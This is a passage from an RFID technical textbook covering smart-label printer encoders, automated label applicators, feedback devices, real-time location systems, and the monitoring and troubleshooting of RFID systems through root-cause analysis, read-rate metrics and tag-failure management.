RFID Printer Encoders
An RFID printer encoder is a component of an RFID printer that writes data to and reads 
data from the tag inside a smart label being used as a media for the printer. We already cov-
ered this topic in the previous section. However, here are the important points to remember 
about a printer encoder:
■ 
They typically operate in HF (13.56 MHz) and UHF (915 MHz).

202 
Chapter 9 • Working With RFID Peripherals
■ 
The behavior of the encoder in a printer can be controlled through the RFID 
control menu.
■ 
An RFID printer encoder supports the following functionality:
■ Reading the data from the tag
■ Modifying, deleting, or writing the data to the tag
■ Verifying the accuracy of the data on the tag
The common faults detected and the errors displayed by an RFID printer encoder were pre-
sented in Table 9.3. Troubleshooting tips for an RFID printer encoder were presented in Table 9.4.
Once the smart labels have been printed by the RFID printer, they will to be attached 
to the items that need to be identiﬁ ed and tracked. This is where the automated label 
applicator enters the RFID story.
Automated Label Applicators
An automated label applicator is a labeling machine that is designed to automate the 
process of applying labels to products. These machines, widely used in manufacturing and 
food processing and distribution departments, can also be used for applying smart labels.
NOTE
Automated label applicators are capable of placing labels consistently in 
the same place on each item to the accuracy of 0.5 mm, and at high speed, 
up to 80 m/minute or 20 packages per minute.
Automatic label applicators can be grouped broadly into two categories: pneumatic 
piston applicators and wipe-on applicators, as described in the following sections.
Pneumatic Piston Label Applicators
The pneumatic piston label applicator is a machine that has a piston to stop a product on a 
line for labeling and then applies the label to it using the tamp-down or blow-on technique. 
For that reason, this category is also called tamp-blow applicators. This type of label applicator is 
suitable under following conditions:
■ 
You want to apply labels to the front, sides, or top of the product (or package), 
typically on an automated production line.

 
Working With RFID Peripherals • Chapter 9 
203
■ 
The product does not have to be moving at a constant speed.
This is how it works:
1. A sensor detects the product.
2. The labeling machine activates a pneumatic piston.
3. The piston stops the product for as long as it takes to apply the label.
4. The label is served on a vacuum plate, which is moved by the pneumatic piston to 
the package.
5. The label is then applied by using one of the following methods:
■ The label is simply pressed against the product, called a tamp-down action.
■ The label is blown onto the product: the vacuum in the vacuum plate is 
replaced with air that provides the pressure to blow the label onto the 
package. In other words, the label is blown onto the package by a blast of 
air. The advantage of this method is that the vacuum plate does not actually 
touch the package: action at a distance.
Wipe-On Label Applicators
A wipe-on label applicator is a machine that performs pressure-sensitive labeling using a 
roller or a brush that wipes down the label on a package. This type of label applicator is suit-
able under the following conditions:
■ 
You want to apply labels to the bottom, sides, or top of a product (or package), 
typically on an automated production line or by using a short length of 
conveyor.
■ 
The product must be reliably moving at a constant speed.
This is how it works:
1. A sensor detects the product.
2. At a ﬁ xed time later, the labeling machine starts to issue the label.
3. The label is applied by tamping it down with the help of a foam roller.
To apply the labels consistently at the same place on each item, the side of the item 
that is to be labeled needs to be in the same position each time and must be reasonably 
ﬂ at. An example of a wipe-on label applicator, the Geset Alpha-V40, is shown in 
Figure 9.4.

204 
Chapter 9 • Working With RFID Peripherals
NOTE
There are many variants on the two types of label applicators that we have 
discussed. For example, in the case of pneumatic piston label applicators, 
a so-called 90-degree labeling machine can apply labels to the front face of 
a package (the leading face of a package in motion), and a labeling machine 
with twin vacuum plates can apply a label to two sides of a package, called 
round the corner. This kind of label applicator can also handle packages of 
variable sizes. A variant of a wipe-on label applicator can also apply labels 
to two sides of a product (round the corner).
In a nutshell, these two categories of label applicator use the following three label-
placing techniques:
■ 
The blow-on technique is used when the product surface must not be touched and 
when the accuracy of label placement is important.
■ 
The tamp-down technique is suitable for pressure-sensitive labeling and uses a 
positive tamp action to ensure the complete label adhesion on the package.
■ 
The wipe-on method is suitable for pressure-sensitive labeling when the product is 
moving at a reliably constant speed.
Figure 9.4 An Example of a Wipe-On Label Applicator (Image Courtesy of 
Weber Marking Systems Inc.)

 
Working With RFID Peripherals • Chapter 9 
205
In fact, most automatic label applicators fall into these two categories and use one or more 
of these three techniques. However, the applicators come in different forms and shapes 
supporting different features, depending on the application requirements. Not all of them are 
fully automatic. So, there are other ways of categorizing the label applicators. Some of these are:
■ 
Automatic label applicators These are the machines that are typically used on 
production lines. We have already discussed these under the wipe-on and pneumatic 
piston applicator categories. Automatic bottle labeling is another example.
■ 
Semi-automatic label applicators In these applicators, part of the process is not 
automated. For example, the product might have to be manually staged for labeling. 
A variant of bottle labeling and handheld label applicators fall in this category. 
A handheld applicator is used to wipe the labels onto the products in a way similar 
to a pricing gun used in retail stores.
■ 
Print and apply label applicators This is a system that offers an integrated 
solution by combining smart label printing and label applying functionalities. The 
label applicator part of the system can be either wipe-on or pneumatic piston, as 
described earlier.
An effective RFID system or network consists of diverse hardware, software, and logic 
to automate the identiﬁ cation and tracking process. An important component of automation 
is event-based action. For example, tell someone when a problem occurs, ask the reader to 
read when a tagged item shows up, and so on. This is where feedback systems come onto 
the scene.
Feedback Systems
Feedback systems in an RFID network, usually based on sensors, help the system run in an 
effective and automatic fashion. The input and output ports in an RFID system are used to 
integrate feedback with the system. For example, turning on or off lights or sound alerts 
could have a predetermined meaning as a feedback on the status of a process. For instance, 
warning noise and a red light might indicate missing items on a shipping pallet. Feedback 
systems, in general, are used for two purposes:
■ 
Report problems with the system, e.g., to trigger a manual intervention.
■ 
Perform an action within the RFID network based on an event—for example, to 
trigger the reader only when some tagged item shows up. This helps automate the 
RFID system.
Commonly used feedback systems or devices used in RFID systems or networks include 
photo eyes, light trees, horns, and motion sensors.

206 
Chapter 9 • Working With RFID Peripherals
Photo Eyes
A photo eye, in general, is a sensor that detects the presence of something coming and 
reports the presence to another device. A photo eye works as an input device to an RFID 
system. It can be used as a proximity sensor that can provide presence and direction 
information of a load. For example, a photo eye sees an item coming on a conveyor and 
triggers the reader to begin reading. It can also be used to determine a good or bad read—that 
is, a good or bad tag. A bad read can prompt actions such as stopping the conveyor and 
triggering a light tree.
So, the following are some of the advantages of photo eyes in an RFID network:
■ 
A photo eye can detect and tell the RFID portal when to start scanning a load 
passing along the conveyor. This minimizes the scan time and helps avoid interference 
between adjacent RFID readers.
■ 
In conjunction with some business logic, a photo eye can also be used for veriﬁ cation 
of tags: they are properly encoded and placed.
Light Trees
A light tree refers to a stack of lights, connected to an output port of an RFID system, 
used as a feedback system. The light tree works as an output device because it reports 
some output of an RFID operation to the operator. It might be used to report a success, a 
failure, a warning, or information. A light tree is typically controlled by a software program 
called an agent. The agent forwards commands to the hardware to turn the tree lights on 
and off. As a practical example, in Websphere, IBM’s software platform integrated with 
RFID, the following are the parameters of a light tree agent to dictate the behavior of the 
light tree:
■ 
duration.ms.beep Represents the amount of time to signal when a beep request 
is received. The default value is 500 ms.
■ 
ignore.green.while.red Dictates whether any green light indicators should be 
ignored if the light tree is currently red. The default value is false.
■ 
duration.ms.green Represents the amount of time to signal when a green light 
request is received. The default value is 2000 ms.
■ 
duration.ms.red Represents the amount of time to signal when a red light 
request is received. The default value is 2000 ms.
Table 9.6 presents some standard light signals, with examples, commonly used in RFID 
systems. A combined scenario using all three lights (green, yellow, and red) is presented in 
Exercise 9.2.

The light tree uses light as a medium for output signals. There are output devices called 
horns that use sound as a medium for output (feedback) signals.
Horns
A horn is a feedback device that gets the attention of the operator by making a sound. It works 
as an output device in an RFID system. For example, the RFID system on a forklift may be 

208 
Chapter 9 • Working With RFID Peripherals
equipped with an impact sensor. When the impact exceeds a speciﬁ ed value, the sensor reports it 
to the RFID system, which triggers the forklift’s horn. Horns are generally used under extreme 
situations that require immediate attention, such as theft, intrusion, emergency, and so on.
Motion Sensors
A motion sensor is a device that detects the movement of an object in its surroundings by 
using some kind of waves such as ultrasonic waves, which are sound waves beyond the 
human ear’s hearing capability. Such a sensor works as an input device to an RFID system. 
The wave emitted by the sensor is reﬂ ected by the object to the sensor, which then calcu-
lates the distance of the object from it. The changing distance (or position) of the object 
means the object is moving. Motion sensors can be used in an RFID system to indicate the 
arrival of tagged items at a portal such as a dock door. In this case, the RFID system, after 
getting the alert from the sensor, will trigger the reader to read the arrived items. The 
motion sensors can also be used against theft by combining them with the tags attached to 
the item that must not be moved. A motion of that tagged item will trigger the motion 
sensor, which in turn will trigger some alarm system.
So, feedback systems and devices report problems with the RFID network and help 
further automate the RFID system by facilitating event-based action. Event-based action 
means an action performed when a certain event occurs. For example, start a read cycle if an 
item is detected in a certain area. Such automation gives rise to powerful RFID systems such 
as real-time location systems.
Real-Time Location Systems
A real-time location system (RTLS) is an RFID system that automatically and continuously 
tracks and reports in real time the location of assets and personnel that are tagged to be 
tracked. An RTLS designed to track moving objects typically works as follows:
■ 
Moving tags An item that needs to be tracked is tagged typically with an active 
tag that regularly transmits signals at some time intervals. The tag, of course, 
contains the unique identiﬁ cation code for the item.
■ 
Stationary readers At certain locations, stationary readers are waiting for the 
tagged items to pass. When a tagged item passes through this location, the readers 
receive the signal from the tag because the tag is continuously transmitting. Upon 
receiving a signal from the tag, they collect the information from the tag about the 
item, and they determine the location of the item. The readers send the location 
and the item data to a monitoring system.
■ 
Monitoring system The monitoring system receives the location information 
about an item being tracked from the readers.

 
Working With RFID Peripherals • Chapter 9 
209
CAUTION
A wide variety of RTLS can be designed. Depending on the application 
requirements, an RTLS can use both active and passive tags and can be used 
to track both moving and stationary objects.
Note the difference between a usual RFID portal and an RTLS. In a typical RFID por-
tal, the tags are read when they pass the portal as part of a structured process, whereas RTLS 
tags are read automatically and regularly, independent of the process that moves the tags. 
With RTLS, no intervention or controlled process is needed to determine asset location; it is 
automated.
RTLS can continuously determine and track the real-time location of moving assets and 
personnel using active RFID tags attached to moving objects. Another type of RTLS, also 
called local locating system (LLS), can be designed to track objects in a constrained location 
(indoor or outdoor) for tracking assets within a corporate facility. In this case, readers are 
installed at key locations within a facility. Active tags attached to objects typically broadcast 
their identity at regular intervals.
NOTE
In an RTLS, a tag is generally read by multiple readers installed at different 
points in a location. Each reader can determine its distance from the object 
by the time it took to get the response for its signal sent to the tag on the 
object. By putting together the distances of the object from all the readers 
and the locations of all the readers, the system can accurately calculate the 
exact location of the object. If the number of readers involved is three, this 
technique is called the triangulation technique.
RTLS are getting popular in many ﬁ elds, including healthcare, manufacturing, and 
logistics, where they help locate and manage high-value assets in daily operations. Following 
are some examples of the use and advantages of RLTS:
■ 
Efﬁ ciently and automatically identify and track valuable assets to ensure that these 
assets remain in the facility. This helps reduce theft.
■ 
Track patients and doctors within a hospital facility. Without an RTLS, ﬁ nding 
doctors, nurses, or patients at critical times without delay could be a challenge.

210 
Chapter 9 • Working With RFID Peripherals
■ 
RTLS can also help address patient safety and security issues. For example, an 
RTLS can be used to trigger an alarm if the wearer of a tag leaves a certain 
perimeter, the authorized or safe area.
■ 
RTLS can help you save time that you would otherwise waste in looking for 
things. RTLS will tell you exactly where the things are.
The three most important takeaways from this chapter are the following:
■ 
RFID printers help integrate the barcode technology with RFID technology as 
they are used to print smart labels like barcode labels and write data to and read 
data from the tags that exist inside the smart labels.
■ 
An automatic label applicator applies labels to products, typically on production 
lines, in an automatic fashion using one of three labeling techniques: blow-on, 
temp-down, or wipe-on.
■ 
Photo eyes and motion sensors are input feedback devices, whereas light trees and 
horns are output feedback devices.

Summary
Smart labels represent the junction between two technologies: barcode and RFID. Smart 
labels are created using an RFID peripheral device called an RFID printer, which can print 
human-readable information on the surface of a label and can write data to the transponder 
(tag) inside the label. Furthermore, an RFID printer can verify the correctness of the data on 
the tag and can void the smart labels with faulty tags inside them. Smart labels, created by an 
RFID printer, can be applied by automatic label applicators to the items that need to be 
tracked. An automatic label applicator applies labels to products, typically on production 
lines, in an automatic fashion using one of three labeling techniques: blow-on, temp-down, 
or wipe-on. In the tamp-down technique, the label is simply pressed against the item; in a 
wipe-on technique, the label is tamped down with the help of a foam roller; and in the 
blow-on technique, the label is blown onto the item by a blast of air.
Once you have deployed an RFID system, including peripheral devices, you always need 
to monitor the system in operation. There will be operational and performance issues and 
problems with the system and its components. How can you troubleshoot problems with an 
RFID system? The next chapter explores this topic.

Chapter 10 • Monitoring and Troubleshooting RFID Systems
Introduction
After you have designed and installed your RFID system, what will inevitably come next? 
The answer to this question is problems, all kinds of problems, including reader failure, tag 
failure, network connectivity problems, and so on. This is where monitoring and 
troubleshooting enter the scene.
An RFID system is made of three components: hardware, software, and data. The 
hardware consists of tags, readers, and antennas. The software largely consists of middleware 
that manages to take the data from the reader to the enterprise applications; it comprises the 
nervous system of the EPCglobal network. Monitoring your RFID system involves status 
monitoring and performance monitoring. Performance monitoring involves measuring some 
performance metrics. To ﬁ nd the causes for the problems identiﬁ ed during monitoring, you 
will need to troubleshoot the system.
So, the core question addressed in this chapter is how to monitor and troubleshoot an 
RFID system. In search of an answer, we will explore three avenues: monitoring, measuring 
performance metrics, and troubleshooting.
Monitoring an RFID System
Monitoring any system is essential to foreseeing and detecting problems and keeping the 
system running effectively. Because RFID is an evolving technology, you might ﬁ nd a lack 
of literature available to guide you in monitoring and troubleshooting an RFID system. 
However, most of the important research and development in any discipline occurs by people 
applying analogies to the way similar problems were solved in related disciplines and building 
on experience acquired in the same discipline. RFID is a closely related ﬁ eld to IT, if not a 
part of it.
The ﬁ rst lesson we can apply from the IT world is that RFID systems should support 
remote monitoring and troubleshooting of equipment, to improve efﬁ ciency and 
effectiveness. System manageability requires that good RFID solutions incorporate remote 
management, which will include remotely monitoring equipment, remotely identifying 
problems and their causes, providing alerts for problems such as failures, and supporting both 
problem troubleshooting and problem resolution.
So, the monitoring techniques used in IT and other ﬁ elds can be applied in some way 
to RFID. In this section we will discuss some of those techniques in the context of RFID. 
A very important problem-solving methodology used in many ﬁ elds, including IT, is root-cause 
analysis.
Understanding Root-Cause Analysis
Organizations often have problems that afﬂ ict their operations and result in reduced proﬁ ts 
and increased customer dissatisfaction. Quite often, organizations try to ﬁ x a problem 

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
217
quickly by addressing the symptoms on the surface and without ever ﬁ nding what really 
caused the problem in the ﬁ rst place. This approach causes the problems to reoccur over and 
over again. The goal of root-cause analysis (RCA) is to prevent the problem from reoccurring 
by ﬁ nding and eliminating the root causes. In other words, RCA is the application of a set 
of problem-solving methods based on identifying and eliminating (or correcting) the root 
causes of a problem. The fundamental assumption in the RCA approach is that the problems 
are best solved by correcting or eliminating the root causes, as opposed to merely addressing 
the immediate, obvious symptoms that appear on the surface.
TIP
By applying corrective measures to root causes once, you must not expect 
that the problems will disappear forever, even though that is the goal. You 
can only hope that the likelihood of problem recurrence will be minimized, 
because completely preventing a problem from reoccuring through a 
one-time intervention is not always possible. Look at RCA as an iterative 
process and a tool for continuous improvement.
RCA involves different approaches from a variety of ﬁ elds for getting at the root causes 
of a problem. The main approaches are:
■ 
Barrier analysis According to this approach, the root causes of a problem exist 
in failed or missing barriers such as safety measures, unrecognized risks, or inade-
quate safety engineering. The process of ﬁ nding the root causes includes assessing 
the adequacy of deployed barriers or recognizing the lack of barriers. This 
approach, which has its origin in the ﬁ elds of accident investigation and 
occupational safety and health, is also called safety-based RCA.
■ 
Change analysis According to this approach, the root cause of a problem often 
exists at the level of strategic management and organizational culture. To ﬁ nd the 
root cause, compare the process with the unsuccessful outcome to a similar process 
with a successful outcome. This approach has its origin in the ﬁ elds of change 
management, risk management, and system management and is also called 
system-based RCA.
■ 
Events and causal factors analysis According to this approach, the root causes 
of a problem lie in not conforming to one or more of the steps in a process. This 
is similar to the malfunctioning of one step out of a set of sequential steps in a 
production line. Finding the root causes here includes examining the events, related 
conditions, and causal factors in chronological order. This approach has its origin in 

218 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
the ﬁ elds of quality control for industrial manufacturing and is also called 
production-based RCA.
■ 
Tree-diagram analysis This approach, an extension of the events and causal 
factor analysis, assumes that the root causes of a problem lie in the process failure in 
general. The underlying philosophy of this approach is that you can eliminate the 
recurrence of problems and increase performance by improving processes. Finding 
the root causes using this approach includes creating and using tree diagrams 
describing the factors contributing to the event that caused the problem. This 
approach is also called process-based RCA.
Depending on your organization, your system, and the problem, you can determine 
which of these RCA approaches is suitable for you. However, the general high-level process 
for performing root-cause analysis is the same:
1. Identify and clearly deﬁ ne the problem.
2. Gather the relevant data, including evidence.
3. Identify the causal factors: all the causes or problems that contributed to the 
occurrence of this problem.
4. Find root causes for each causal factor, and iteratively arrive at the ultimate root 
cause of the problem.
5. Develop recommendations for solutions.
6. Implement the approved solutions.
So, keep the following principles of RCA in mind:
■ 
Applying corrective measures to root causes of a problem is more effective than just 
addressing the symptoms of the problem.
■ 
To get optimal results, RCA must be performed in a systematic fashion, and its 
conclusions must be backed up by evidence.
■ 
There can be (and usually is) more than one root cause for a given problem.
So far, we have discussed RCA in general. But how does it apply to an RFID system? 
RFID is an evolving part of the IT industry. In the IT industry, it is a common practice to 
look at various data inputs from related incidents and identify the root causes by recognizing 
the correlations between those incidents. The same practice is being applied in its basic form 
to RFID systems.
The important point here is that in system problem solving, you need to go beyond just core 
monitoring of individual devices and collect some data that will help troubleshoot the problem. 
Is this data available from normal operation, or do you collect it just for troubleshooting the 
problem? This brings us to a discussion of the various types of monitoring.

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
219
Understanding Monitoring
To monitor a system, you need information (data) about the system. For example, to monitor 
an RFID system, you will need information from readers. Depending on how you receive 
this information, there are two kinds of monitoring:
■ 
Nonintrusive monitoring In this type of monitoring, you use the information 
that is available from normal operation. Therefore, you place no extra requirement 
for information on the RFID system. For example, all the information that a reader 
gathers from normal interrogation of a tag falls into this category.
■ 
Intrusive monitoring This is a type of monitoring that requires collecting the 
information that is not available from normal operation of the system. For example, 
your reader might offer commands that you can issue to gather information about 
its internal status or condition. This kind of intrusive information can help you 
detect (or predict) problems that might not be evident from nonintrusive 
information.
Usually nonintrusive information is enough to ﬁ nd the status of a device, such as a 
reader—for example, whether it’s working or not. However, nonintrusive information might 
be needed to look deeply into a problem and ﬁ nd the root cause.
NOTE
Nonintrusive monitoring might be good enough to check the status of a 
reader, whereas intrusive monitoring might be needed to get a deeper 
insight into the system, to ﬁ nd the root cause of a problem or to predict a 
future problem.
From the perspective of the system details that you want to monitor, there are two kinds 
of monitoring: status monitoring and performance monitoring.
Status Monitoring
Status monitoring consists of monitoring the basic status of the system and the devices in the 
system, such as the following:
■ 
Is the device connected to the network?
■ 
Are the devices powered?
■ 
Are the antennas operating?
■ 
Is a reader reading the tags successfully?

220 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
Some solutions include a status indicator panel on your desktop that will allow you to 
monitor the status of all readers from one location. Feedback systems such as light tree and 
horns, discussed in Chapter 9, can also play an important role in this type of monitoring.
The next level of detail in monitoring is performance monitoring.
Performance Monitoring
Performance monitoring consists of monitoring the performance of a system and the devices in 
the system, such as the following:
■ 
Read rates of readers
■ 
Reading accuracy
■ 
Error frequency: how frequently an error occurs
The performance data on predetermined metrics such as read rates helps determine the 
normal behavior of the system and identify the variance in the normal behavior and hence a 
problem. For this reason, performance monitoring is also called behavior monitoring.
Equipped with this understanding of monitoring your RFID system, you are ready to 
explore ways to troubleshoot an interrogation zone.
Monitoring and Troubleshooting 
Interrogation Zones
You often monitor a system by monitoring a set of metrics. A metric is an observable 
property that can be measured. It’s also called a quantity. A metric is composed of some 
parameters that deﬁ ne the system and its performance. Following are the parameters that 
characterize an interrogation zone:
■ 
Reader failure
■ 
Number of tags passing through an interrogation zone
■ 
Number of tags being successfully read
■ 
Number of tags that are not being successfully read (read errors)
Based on these parameters, you can deﬁ ne metrics that can be measured or calculated 
beased on the measurements and that will indicate the status of an RFID system and its 
performance. Some examples of such metrics are discussed in the following sections.
Mean Time Between Failures (MTBF)
Mean time between failures (MTBF) is the average time between two consecutive failures of a 
device or a system. Usually there is an underlying assumption in calculating MTBF: After 

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
221
each failure, the system is ﬁ xed and returned to service immediately. This is a measure of 
reliability, robustness, and stability of the system. It can be applied to system components or 
to the system itself. In our case, the system is the RFID system and the components are the 
antennas, readers, host computer, and other network elements.
What do we mean by a failure? We need to deﬁ ne that. For example, on one extreme, 
you can consider that a reader has failed if it’s not operational at all; on the other end of the 
spectrum, you could consider it failed when it misses a tag read or creates read error. In 
general, you can determine a threshold of read errors, and when the number of read errors 
exceeds the threshold, the reader may be considered failed.
MTBF indicates the robustness of the system measured in the past and, based on that 
measurement, predicts the rate of failure in the near future. MTBF can be calculated using 
the following simple equation:
MTBF = TL/NF
where:
■ 
TL is the total lifetime (or operation time) of the device or the system over which 
the MTBF is being measured.
■ 
NF is the total number of failures recorded.
For example, if a reader fails twice during 200 hours of operation, the MTBF can be 
calculated as in the following:
MTBF = TL/NF = 200/2 = 100 hours
Average Tag Trafﬁ c Volume
Average tag trafﬁ c volume (ATTV) is the average number of tags passing through an interrogation 
zone during an interval of time. The interval can be a minute, 10 minutes, an hour, or 
whatever you determine it to be. This metric is important for the following two reasons:
■ 
It indicates how much load the reader has to deal with on a portal.
■ 
When a reader reads a tag, it typically sends the collected data to a host computer. 
So the tag trafﬁ c increases the data trafﬁ c in the network.
To measure ATTV, the monitoring system collects the following data from the readers:
■ 
Tag counts
■ 
The time at which the tag was counted
With this data, the ATTV can be calulcated using the following equation:
ATTV = 1/N S
i=N ti
i=1

222 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
where:
■ 
N is the number of intervals for which the measurement is being taken.
■ 
ti is the number of tags counted during an interval denoted by i.
Let’s work through a simple example. Assume that you determine the interval to be 15 
minutes, and you collect the data over an hour. In the four quarters of the hour, 50, 35, 30, 
and 45 tags are detected, respectively. So, you can calculate the ATTV as shown in the 
following:
AT TV = 1/N S
i=N ti = ¼ (50 + 35 + 30 + 45) = 160/4 = 40 tags per 15 minutes
i=1
How do you determine the time interval? That depends on your application and the 
system requirements. But keep in mind that if your interval is too long, say, a few hours, you 
cannot see the pattern of trafﬁ c (how the trafﬁ c changes during this interval), and if your 
pattern is too short, you’ll have too many data points to deal with unnecessarily.
So, the ATTV indicates the following:
■ 
How much tag trafﬁ c is ﬂ owing through the interrogation zone.
■ 
The pattern of trafﬁ c, that is, how the trafﬁ c changes with time; for example, you 
can see the pattern by taking 24 measurements of ATTV each day.
From the ATTV measurements, you can predict how much trafﬁ c is expected to pass 
through an interrogation zone during a certain period. The accuracy of this prediction partly 
depends on the amount of data that was collected to make this prediction, that is, the 
statistical uncertainty.
Actual Versus Predicted Trafﬁ c Rate
It’s always of interest to measure the variance between the predicted values of a metric with 
its actual value. Actual versus predicted trafﬁ c rate (APTR) is the variance of the actual tag 
trafﬁ c from the predicted tag trafﬁ c through an interrogation zone over a time period. The 
predicted tag trafﬁ c rate can come from the ATTV measurements in the past. A signiﬁ cant 
variance of actual trafﬁ c rate from the predicted trafﬁ c rate could indicate a problem with 
the system.
The APTR can be calculated using the following equation:
APTR = 1/N 
i=N (ta – tp)
i=1
where:
■ 
N is the number of intervals for which the actual measurement is taken.
■ 
ta is the actual current ATTV.
■ 
tp is the predicted ATTV from the past measurements.

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
223
The larger the magnitude of APTR, the larger the variance of the actual value from the 
predicted value, and therefore the louder is the alarm that there could be something wrong 
with the system. Make sure you are comparing the actual value to the predicted value for 
the same time interval, because the predicted (and also the actual) values for different time 
intervals could be different. For example, in a given day, there might be more tag trafﬁ c from 
2:00 to 3:00 p.m. than from 7:00 to 8:00 a.m.
Read Errors to Total Reads Rate
Read errors to total reads rate (RETR) is the total number of read errors divided by the total 
number of read attempts. A read error is reader’s a failed attempt to read a tag. The measure of 
RETR can indicate the problems that caused the read errors, including:
■ 
A faulty antenna.
■ 
Faulty tags or improperly tagged items.
■ 
Improper placement of antennas.
■ 
Low signal strength.
■ 
Signal interference, signal absorption, or any other adverse 
environmental effect.
To measure RETR, the monitoring system collects the data about number of read 
errors, number of successful reads, and the time interval during which these read attempts 
were made. With this data collected for a few intervals, you can calculate RETR using the 
following equation:
RETR = (S
i=N Ei) / (S
i=N Ei + S
i=N Si) = 1/ (1 + S
i=N Si / S
i=N Ei)
i=1
i=1
i=1
i=1
i=1
where:
■ 
N is the number of intervals for which the measurements are taken.
■ 
Ei is the number of read errors during the interval i.
■ 
Si is the number of successful reads during the interval i.
A high value for RETR should be taken as an alarm for a problem with the RFID 
system (or portal): either an internal problem or due to adverse environmental effects such 
as absorption and interference.
The value of RETR can change over time.
Read Error Change Rate
Read error change rate (RECR) is the variance of RETR over time. It indicates the 
instability or unreliability of the RFID system. For example, a continuous increase or 

224 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
ﬂ uctuation in the value of RETR indicates an underlying problem with the system. 
Upon troubleshooting, you might ﬁ nd a fault with the design of the system or with the 
hardware components.
Monitoring and Troubleshooting Tags
Even though the process of manufacturing of tags and their application to items has 
signiﬁ cantly matured, tag failures do still occur due to various reasons. Therefore, monitoring 
and troubleshooting tags are important tasks for an RFID professional. First of all, you need to 
ensure that the tags are properly placed on items. Furthermore, you need to know the reasons 
the tags can fail and how to manage tag failures. The tags are placed on items to be tracked 
before the items get out into the world. So, the ﬁ rst step in monitoring tags is to identify 
improperly tagged items.
Identifying Improperly Tagged Items
Proper tag placement on items that need to be tagged is crucial to the success of an RFID 
application. The challenge is to choose the right spot on an item where the tag will be 
placed. The right spot really depends on the kind of item; it will vary from one type of item 
to another. Therefore, testing to choose the right spot is necessary before you start using 
label applicators to place labels on a mass scale.
Even after you have chosen the right spot to place tags on items, there will be misplaced 
or improperly placed tags, which will cause problems. So, it’s important to identify those tags. 
There are four kinds of improperly tagged items:
■ 
Items that are tagged with faulty tags.
■ 
Items on which the tags are placed incorrectly, where they cannot be read properly 
by the reader.
■ 
Items on which the tags are placed at the correct spots but on which the tags are 
applied incorrectly, perhaps bent or folded.
■ 
Items on which the tags are not properly oriented when correct orientation is 
required for efﬁ cient reading.
Tags can fail due to the defects introduced during manufacturing, and manufacturing 
defect rates are relatively high in smart labels, discussed in Chapter 9. If you are using smart 
label printers to print these labels, it will identify the smart label with a faulty tag and mark 
it void. For pre-encoded smart labels, you will lose the identiﬁ cation numbers (serial 
numbers) along with the faulty label.

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
225
Following are some of the methods for identifying improperly tagged items:
■ 
Inventory discrepancies can indicate improperly tagged items because the tags on 
the items were not properly read; hence the items were not counted.
■ 
Some feedback devices, such as photo eyes and motion sensors, provide the presence 
information of an item and instruct the reader to read it. If the reader cannot see it, 
it could be an improperly tagged item.
■ 
Improperly tagged items can also be identiﬁ ed by combining the information from 
the sensors with the logic in the software.
■ 
Improperly tagged items can be identiﬁ ed during automatic application of labels 
by placing an interrogation portal right after the application point—for 
example, on a read portal. If the tag cannot be read, it might be defective or 
improperly placed.
■ 
You can also identify improperly tagged items via manual inspection, perhaps 
before shipping.
The tags on improperly tagged items are prime for failure. There are, however, a 
multitude of reasons that a tag would fail.
Identifying Reasons for Tag Failures
A tag failure can be deﬁ ned as the inability of a properly functioning reader to detect a tag 
when it’s scanning its interrogation zone. In other words, a tag is considered failed when a 
reader cannot detect it when the tag is within the reader’s read range. By identifying and 
understanding the reasons for tag failures, you can take steps to avoid failures, identify 
failures, and ﬁ x problems, thereby optimizing the performance of your RFID system. 
Following are the main reasons for tag failures:
■ 
Manufacturing defects These are defects that are introduced during 
manufacturing. They can be detected in the process of testing or applying the 
tag. For example, if you are using a smart label printer to print these labels, 
it will identify the smart label that has a faulty tag and mark it void. The 
printer can also introduce the error because it can write to the tag inside the 
smart label.
■ 
Wrong tag type A tag failure can happen because a wrong tag type was applied 
for a given application.
■ 
ESD The ESD, discussed in Chapter 8, can damage the transistors in a tag’s IC 
and thereby cause the tag to malfunction.

226 
Chapter 10 • Monitoring and Troubleshooting RFID Systems
■ 
Harsh environmental conditions Harsh environmental conditions can cause 
adverse effects that can affect tag detection in the following ways:
■ Some conditions such as extreme temperature can damage tags, causing 
them to fail.
■ Some materials in the environment can cause effects such as interference, 
reﬂ ection, diffraction, and scattering that can prevent the reader from properly 
communicating with the tag, making it look as though the tag does not exist.
■ Tags can also be damaged by mishandling of the tagged items.
■ The material of the package surface or the content can affect the tag read. 
For example, the read rates could be very low for tags placed on metallic 
containers due to reﬂ ection and interference problems.
■ 
Improper placement An improperly placed tag on an item can be damaged or 
simply might not be detected by the reader. Improper placement includes the 
wrong spot on the item for the tag; the wrong way to place the tag, such as folding 
it; or the wrong orientation of the tag.
■ 
Dense tag environment The dense tag environment, discussed in Chapter 4, also 
prevents a tag from being detected by a reader. For example, the shadowing effect 
created by the dense tag environment prevents a tag from being read by the reader.
To ﬁ x the problems caused by tag failures and to control the damage, you need to 
manage tag failures.
Managing Tag Failures
Tag failures can have a signiﬁ cant impact on the effectiveness and efﬁ ciency of an RFID 
system. Therefore, it is very important to manage tag failures. You can improve system 
performance by identifying and possibly ﬁ xing tag failures before the tagged items get into 
the tracking network. In general, you need to manage tag failure before applying the tags, 
during the tag application process, and after the tag application, when the item is being 
tracked.
Management Prior to Applying Tags
Some integrated automatic tag application solutions offer the following failed tag 
management features:
■ 
Identify and eliminate the faulty tags prior to applying them to the items.
■ 
Track the statistics on the failed tags and communicate them to the RFID 
validation stations.

 
Monitoring and Troubleshooting RFID Systems • Chapter 10 
227
Management During Application
You can set up a test interrogation portal (zone) immediately after the point where the tags 
are being applied by an automatic applicator. The idea behind managing the tag failure prior 
to and during tag application is to prevent these tags entering the tracking system. You will 
certainly improve system performance by identifying and ﬁ xing tag failure problems before 
they enter the tracking system. However, tag failures do occur when the items are being 
tracked, and you need to manage those failures as well.
Management After Applying the Tags/During Tracking
The items with failed tags that are being tracked will generate data inconsistencies such as 
inventory discrepancies. To deal with such problems, it is important that tag failures are iden-
tiﬁ ed and the information reported to the application program or the database management 
system automatically. The EPCglobal network helps in management of failed tag data in the 
tracking system by making the information about the globally tracked items visible through-
out the tracking system, such as supply chain. This network consists of ﬁ ve elements:
■ 
EPC The identiﬁ cation number on the tag that uniquely identiﬁ es the 
tagged item.
■ 
EPC tags and readers The reader reads the tag of an item being tracked and 
